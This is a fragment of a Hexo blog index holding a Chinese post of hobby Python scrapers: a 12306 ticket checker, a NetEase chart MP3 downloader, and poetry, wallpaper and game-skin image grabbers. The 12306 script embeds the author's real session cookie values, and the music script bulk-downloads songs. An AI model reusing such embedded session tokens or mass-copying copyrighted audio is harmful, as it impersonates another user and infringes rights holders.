      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 论文 </tag>
            
            <tag> 机器学习 </tag>
            
            <tag> 入侵检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫</title>
      <link href="/2022/04/06/python-crawler/"/>
      <url>/2022/04/06/python-crawler/</url>
      
        <content type="html"><![CDATA[<h3 id="Python爬虫学习"><a href="#Python爬虫学习" class="headerlink" title="Python爬虫学习"></a>Python爬虫学习</h3><p>整理了一下以前写过的一些小爬虫。</p><h4 id="12306查票"><a href="#12306查票" class="headerlink" title="12306查票"></a>12306查票</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 12306Check.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反复查询加循环即可</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;stations.json&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">text = f.read()</span><br><span class="line">city_json = json.loads(text)</span><br><span class="line">f.close()</span><br><span class="line">from_station = <span class="built_in">input</span>(<span class="string">&#x27;始发站：&#x27;</span>)</span><br><span class="line">to_station = <span class="built_in">input</span>(<span class="string">&#x27;终点站：&#x27;</span>)</span><br><span class="line">train_date = <span class="built_in">input</span>(<span class="string">&#x27;发车日期（格式：2022-04-03）：&#x27;</span>)</span><br><span class="line"><span class="comment"># from_station = &#x27;武汉&#x27;</span></span><br><span class="line"><span class="comment"># to_station = &#x27;长沙&#x27;</span></span><br><span class="line"><span class="comment"># train_date = &#x27;2022-04-06&#x27;</span></span><br><span class="line"><span class="comment"># print(city_json[from_station])</span></span><br><span class="line"><span class="comment"># print(city_json[to_station])</span></span><br><span class="line"><span class="comment"># print(train_date)</span></span><br><span class="line">url = <span class="string">&quot;https://kyfw.12306.cn/otn/leftTicket/query&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;leftTicketDTO.train_date&#x27;</span>: train_date,</span><br><span class="line"><span class="string">&#x27;leftTicketDTO.from_station&#x27;</span>: city_json[from_station],</span><br><span class="line"><span class="string">&#x27;leftTicketDTO.to_station&#x27;</span>: city_json[to_station],</span><br><span class="line"><span class="string">&#x27;purpose_codes&#x27;</span>: <span class="string">&#x27;ADULT&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers =&#123;</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;_uab_collina=164896135403377792450208; JSESSIONID=843F9AA2FC700ED2B8E8655CBA8E4AFD; BIGipServerotn=468713994.50210.0000; BIGipServerpool_passport=182714890.50215.0000; highContrastMode=defaltMode; guidesStatus=off; cursorStatus=off; RAIL_EXPIRATION=1649305414970; RAIL_DEVICEID=i7hoNlwMechBKbH0Ghsk6cswUh1nhyGKgfThBDYYiAGy_zBKBevr3wq6zqlS1GV-JvK0B-qVEYwihXSg-WVTUlOcG7NgUJc2INRx-UN6MMxdgg6sumeKjo2NXUwAOlNL7uSajwkmH4Aleee-puGjfAVFL2aVyYMY; route=9036359bb8a8a461c164a04f8f50b252; _jc_save_toStation=%u957F%u6C99%2CCSQ; _jc_save_fromDate=2022-04-03; _jc_save_toDate=2022-04-03; _jc_save_wfdc_flag=dc; _jc_save_fromStation=%u6B66%u6C49%2CWHN&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,params=data,headers=headers)</span><br><span class="line"><span class="comment"># &lt;Response [200]&gt; 获取响应体对象</span></span><br><span class="line"><span class="comment"># response.text 获取响应体的文本数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 乱码时可以使用以下方法</span></span><br><span class="line"><span class="comment"># response.encoding = &#x27;utf-8&#x27; #指定utf-8</span></span><br><span class="line">response.encoding = response.apparent_encoding <span class="comment">#自动转码</span></span><br><span class="line">result = response.json()[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;result&#x27;</span>]</span><br><span class="line">lis = []</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> result:</span><br><span class="line">index_list = index.replace(<span class="string">&#x27;有&#x27;</span>,<span class="string">&#x27;Yes&#x27;</span>).replace(<span class="string">&#x27;无&#x27;</span>,<span class="string">&#x27;No&#x27;</span>).split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line"><span class="comment"># index_list = index.split(&#x27;|&#x27;)</span></span><br><span class="line">TrainNum = index_list[<span class="number">3</span>]</span><br><span class="line">StartTime = index_list[<span class="number">8</span>]</span><br><span class="line">EndTime = index_list[<span class="number">9</span>]</span><br><span class="line">UseTime = index_list[<span class="number">10</span>]</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;G&#x27;</span> <span class="keyword">in</span> TrainNum):</span><br><span class="line">BussinessSeats = index_list[<span class="number">32</span>] <span class="comment">#商务座</span></span><br><span class="line">FirstSeats = index_list[<span class="number">31</span>] <span class="comment">#一等座</span></span><br><span class="line">SecondSeats = index_list[<span class="number">30</span>] <span class="comment">#二等座</span></span><br><span class="line">di = &#123;</span><br><span class="line"><span class="string">&#x27;Num&#x27;</span>: TrainNum,</span><br><span class="line"><span class="string">&#x27;Start&#x27;</span>: StartTime,</span><br><span class="line"><span class="string">&#x27;End&#x27;</span>: EndTime,</span><br><span class="line"><span class="string">&quot;Use&quot;</span>: UseTime,</span><br><span class="line"><span class="string">&quot;Top&quot;</span>: BussinessSeats,</span><br><span class="line"><span class="string">&quot;First&quot;</span>: FirstSeats,</span><br><span class="line"><span class="string">&quot;Second&quot;</span>: SecondSeats,</span><br><span class="line"><span class="string">&quot;Soft&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;HBed&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;HSeats&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;NSeats&quot;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">SoftBeds = index_list[<span class="number">23</span>] <span class="comment">#软卧</span></span><br><span class="line">HardBeds = index_list[<span class="number">28</span>] <span class="comment">#硬卧</span></span><br><span class="line">HardSeats = index_list[<span class="number">29</span>] <span class="comment">#硬座</span></span><br><span class="line">NoSeats = index_list[<span class="number">26</span>] <span class="comment">#无座</span></span><br><span class="line">di = &#123;</span><br><span class="line"><span class="string">&#x27;Num&#x27;</span>: TrainNum,</span><br><span class="line"><span class="string">&#x27;Start&#x27;</span>: StartTime,</span><br><span class="line"><span class="string">&#x27;End&#x27;</span>: EndTime,</span><br><span class="line"><span class="string">&quot;Use&quot;</span>: UseTime,</span><br><span class="line"><span class="string">&quot;Top&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;First&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;Second&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;Soft&quot;</span>: SoftBeds,</span><br><span class="line"><span class="string">&quot;HBed&quot;</span>: HardBeds,</span><br><span class="line"><span class="string">&quot;HSeats&quot;</span>: HardSeats,</span><br><span class="line"><span class="string">&quot;NSeats&quot;</span>: NoSeats</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># print(di)</span></span><br><span class="line">lis.append(di)</span><br><span class="line">pd.set_option(<span class="string">&#x27;display.max_rows&#x27;</span>,<span class="literal">None</span>) <span class="comment">#展示最大化，把所有行展示出来</span></span><br><span class="line">content = pd.DataFrame(lis)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/06/fDMaIr74u2E1OZn.png" alt="image-20220406083305519.png"></p><p>生成stations.json文件：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#get_station_code.py</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> RequestException</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getResponse</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">        response = requests.get(url,headers = headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> RequestException:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&quot;https://kyfw.12306.cn/otn/resources/js/framework/station_name.js&quot;</span></span><br><span class="line">    data = getResponse(url)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        dict_data = &#123;&#125;</span><br><span class="line">        text = data.text</span><br><span class="line">        str_split = text.split(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> chars <span class="keyword">in</span> str_split[<span class="number">1</span>:]:</span><br><span class="line">            station = chars.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">            dict_data[station[<span class="number">1</span>]] = station[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;stations.json&quot;</span>,<span class="string">&#x27;w&#x27;</span>,encoding = <span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">            json.dump(dict_data,fp,ensure_ascii = <span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h4 id="网易云热歌爬取"><a href="#网易云热歌爬取" class="headerlink" title="网易云热歌爬取"></a>网易云热歌爬取</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 163MusicGet.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|\✩\˚\*\•̩̩͙ʚ]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#各个符号间用转义字符隔开</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;music\\&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://music.163.com/discover/toplist?id=19723756&quot;</span> <span class="comment">#不同榜单切换该id即可</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,headers=headers)</span><br><span class="line">html_data = re.findall(<span class="string">&#x27;&lt;li&gt;&lt;a href=&quot;/song\?id=(\d+)&quot;&gt;(.*?)&lt;/a&gt;&#x27;</span>,response.text) <span class="comment"># ？前面记得加个转义字符</span></span><br><span class="line"><span class="keyword">for</span> music_id,music_name <span class="keyword">in</span> html_data:</span><br><span class="line"><span class="comment"># 下载地址：https://music.163.com/song/media/outer/url?id=1933915376.mp3</span></span><br><span class="line">music_url = <span class="string">f&quot;https://music.163.com/song/media/outer/url?id=<span class="subst">&#123;music_id&#125;</span>.mp3&quot;</span></span><br><span class="line">music_content = requests.get(url=music_url,headers=headers).content</span><br><span class="line">music_name = change_name(music_name)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename + music_name +<span class="string">&#x27;.mp3&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(music_content)</span><br><span class="line"><span class="built_in">print</span>(music_id,music_name)</span><br></pre></td></tr></table></figure><p>MP3文件保存在music文件夹下：</p><p><img src="https://s2.loli.net/2022/04/06/u73hIWizV69jsMb.png" alt="image-20220406084013424.png"></p><h4 id="古诗词爬取"><a href="#古诗词爬取" class="headerlink" title="古诗词爬取"></a>古诗词爬取</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PoetryGet.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.oh100.com/shici/1127009.html&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,headers=headers)</span><br><span class="line">response.encoding = response.apparent_encoding</span><br><span class="line">li = re.findall(<span class="string">&quot;\d+?、(.*?)&lt;/p&gt;&lt;p&gt;&quot;</span>,response.text)</span><br><span class="line">li[-<span class="number">1</span>] = re.sub(<span class="string">r&quot;&lt;/p&gt;&lt;script&gt;s\(\&quot;content_relate\&quot;\)\;\&lt;\/script\&gt;\&lt;p\&gt;\【形容洒脱的诗词\】相关文章\：&quot;</span>,<span class="string">&quot;&quot;</span>,li[-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> se <span class="keyword">in</span> li:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;- &quot;</span>+se)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/06/JXvfrT9FMqRDAPa.png" alt="image-20220406084235256.png"></p><h4 id="壁纸爬取"><a href="#壁纸爬取" class="headerlink" title="壁纸爬取"></a>壁纸爬取</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># WallPaperGet.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">整体思路：</span></span><br><span class="line"><span class="string">1、访问网站查看信息（F12不可用可以先在别的网页打开再访问该网址）</span></span><br><span class="line"><span class="string">2、进入对应tag观察request的headers等信息（注意要点击加载更多后再看XHR下的文件）</span></span><br><span class="line"><span class="string">3、进入特定照片观察信息</span></span><br><span class="line"><span class="string">4、在text属性中获取title、img_url等信息</span></span><br><span class="line"><span class="string">5、在本地保存下来</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;img\\&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_title</span>(<span class="params">name</span>): <span class="comment">#重命名文件，防止原有保存文件名不合法</span></span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#各个符号间用转义字符隔开</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>): <span class="comment">#指定页数</span></span><br><span class="line">url = <span class="string">f&quot;https://m.bcoderss.com/tag/%e7%be%8e%e5%a5%b3/page/<span class="subst">&#123;page&#125;</span>/&quot;</span> <span class="comment"># %e7%be%8e%e5%a5%b3代表了美女这个标签，可以自行选择</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,headers=headers) <span class="comment">#该网站是个post请求但是不需要传params</span></span><br><span class="line"><span class="comment"># print(response.text)</span></span><br><span class="line">href = re.findall(<span class="string">&#x27;&lt;li&gt;&lt;a target=&quot;_blank&quot; href=&quot;(.*?)&quot;&#x27;</span>,response.text)[<span class="number">2</span>:] <span class="comment">#找到所有的照片初始地址，前两个是无用地址</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> href:</span><br><span class="line">response_1 = requests.get(url=index,headers=headers) <span class="comment">#访问照片初始地址</span></span><br><span class="line">title = re.findall(<span class="string">&quot;&lt;title&gt;(.*?)&lt;/title&gt;&quot;</span>,response_1.text)[<span class="number">0</span>] <span class="comment">#获取照片标题</span></span><br><span class="line">title = change_title(title)</span><br><span class="line">img_url = re.findall(<span class="string">&#x27;&lt;img alt=&quot;.*?&quot; title=&quot;.*?&quot; src=&quot;(.*?)&quot;&gt;&#x27;</span>,response_1.text)[<span class="number">0</span>] <span class="comment">#获取照片下载地址</span></span><br><span class="line">img_content = requests.get(url=img_url,headers=headers).content <span class="comment">#获取照片内容</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename + title + <span class="string">&#x27;.jpg&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f: <span class="comment">#保存照片</span></span><br><span class="line">f.write(img_content)</span><br><span class="line"><span class="built_in">print</span>(title,img_url)</span><br></pre></td></tr></table></figure><p>壁纸会保存在img文件夹下（图片不是很适合放出来，就放下文字吧…）</p><p><img src="https://s2.loli.net/2022/04/06/hgFZor87UKQkRjd.png" alt="image-20220406084429168.png"></p><h4 id="LOL英雄皮肤图片爬取"><a href="#LOL英雄皮肤图片爬取" class="headerlink" title="LOL英雄皮肤图片爬取"></a>LOL英雄皮肤图片爬取</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># LOL.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|\✩\˚\*\•̩̩͙ʚ]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#各个符号间用转义字符隔开</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_img</span>(<span class="params">name,title,skin_name,skin_url</span>):</span><br><span class="line">filename = <span class="string">f&#x27;<span class="subst">&#123;name+title&#125;</span>\\&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line">content = requests.get(url=skin_url,headers=headers).content</span><br><span class="line">newname = change_name(skin_name)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename+newname+<span class="string">&#x27;.jpg&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(content)</span><br><span class="line"><span class="built_in">print</span>(skin_name)</span><br><span class="line"></span><br><span class="line">hero_list_url = <span class="string">&quot;https://game.gtimg.cn/images/lol/act/img/js/heroList/hero_list.js?ts=2748291&quot;</span></span><br><span class="line">response = requests.get(url=hero_list_url,headers=headers)</span><br><span class="line">hero_list = response.json()[<span class="string">&#x27;hero&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> hero <span class="keyword">in</span> hero_list:</span><br><span class="line">hero_id = hero[<span class="string">&#x27;heroId&#x27;</span>]</span><br><span class="line">hero_name = hero[<span class="string">&#x27;name&#x27;</span>] </span><br><span class="line">hero_title = hero[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">hero_url = <span class="string">f&quot;https://game.gtimg.cn/images/lol/act/img/js/hero/<span class="subst">&#123;hero_id&#125;</span>.js&quot;</span></span><br><span class="line">response_1 = requests.get(url=hero_url,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(hero_id,hero_name,hero_title)</span><br><span class="line">skin_list = response_1.json()[<span class="string">&#x27;skins&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> skin <span class="keyword">in</span> skin_list:</span><br><span class="line"><span class="keyword">if</span>(skin[<span class="string">&#x27;mainImg&#x27;</span>]):</span><br><span class="line">skin_url = skin[<span class="string">&#x27;mainImg&#x27;</span>]</span><br><span class="line">skin_name = skin[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">save_img(hero_name,hero_title,skin_name,skin_url)</span><br><span class="line"><span class="comment"># print(skin_url)</span></span><br></pre></td></tr></table></figure><p>各个英雄的皮肤会保存在自己的文件下：</p><p><img src="https://s2.loli.net/2022/04/06/LEcIVRNbux1rnDA.png" alt="image-20220406084813906.png"></p><p><img src="https://s2.loli.net/2022/04/06/R4XxZkbLVtwQcHe.png" alt="image-20220406084841993.png"></p><h4 id="王者荣耀英雄皮肤爬取"><a href="#王者荣耀英雄皮肤爬取" class="headerlink" title="王者荣耀英雄皮肤爬取"></a>王者荣耀英雄皮肤爬取</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># wzry.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|\✩\˚\*\•̩̩͙ʚ]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#各个符号间用转义字符隔开</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_img</span>(<span class="params">name,title,skin_name,skin_url</span>):</span><br><span class="line">filename = <span class="string">f&quot;<span class="subst">&#123;title+name&#125;</span>\\&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line">content = requests.get(url=skin_url,headers=headers).content</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename+skin_name+<span class="string">&#x27;_&#x27;</span>+name+<span class="string">&#x27;.jpg&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(content)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">herolist_url = <span class="string">&quot;https://pvp.qq.com/web201605/js/herolist.json&quot;</span></span><br><span class="line">herolist = requests.get(url=herolist_url,headers=headers).json()</span><br><span class="line"><span class="keyword">for</span> hero <span class="keyword">in</span> herolist:</span><br><span class="line">hero_ename = hero[<span class="string">&#x27;ename&#x27;</span>]</span><br><span class="line">hero_name = hero[<span class="string">&#x27;cname&#x27;</span>]</span><br><span class="line">hero_title = hero[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(hero_ename,hero[<span class="string">&#x27;cname&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;skin_name&#x27;</span> <span class="keyword">in</span> hero):</span><br><span class="line">skin_list = hero[<span class="string">&#x27;skin_name&#x27;</span>].split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">hero_url = <span class="string">f&quot;https://pvp.qq.com/web201605/herodetail/<span class="subst">&#123;hero_ename&#125;</span>.shtml&quot;</span></span><br><span class="line">response = requests.get(url=hero_url,headers=headers)</span><br><span class="line">response.encoding = response.apparent_encoding</span><br><span class="line">tu = re.findall(<span class="string">&#x27;&lt;ul class=\&quot;pic-pf-list pic-pf-list3\&quot; data-imgname=\&quot;(.*?)\&amp;0\|(.*?)\&amp;0\|(.*?)\&amp;72\&quot;&gt;&#x27;</span>,response.text)</span><br><span class="line">skin_list = <span class="built_in">list</span>(tu[<span class="number">0</span>])</span><br><span class="line">skin_lens = <span class="built_in">len</span>(skin_list)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(skin_lens):</span><br><span class="line">skin_url = <span class="string">f&quot;https://game.gtimg.cn/images/yxzj/img201606/heroimg/<span class="subst">&#123;hero_ename&#125;</span>/<span class="subst">&#123;hero_ename&#125;</span>-bigskin-<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>.jpg&quot;</span></span><br><span class="line">skin_name = skin_list[i]</span><br><span class="line">save_img(hero_name,hero_title,skin_name,skin_url)</span><br><span class="line"><span class="built_in">print</span>(skin_name,hero_name)</span><br></pre></td></tr></table></figure><p>文件保存思路与LOL一致：</p><p><img src="https://s2.loli.net/2022/04/06/qpJTLrSeatgcbKk.png" alt="image-20220406085029196.png"></p><p><img src="https://s2.loli.net/2022/04/06/6RMvwCJk37HqOfi.png" alt="image-20220406085046682.png"></p><h4 id="未完待续……"><a href="#未完待续……" class="headerlink" title="未完待续……"></a>未完待续……</h4>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/04/05/hello-world/"/>
      <url>/2022/04/05/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> Test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test1 </tag>
            
            <tag> test2 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
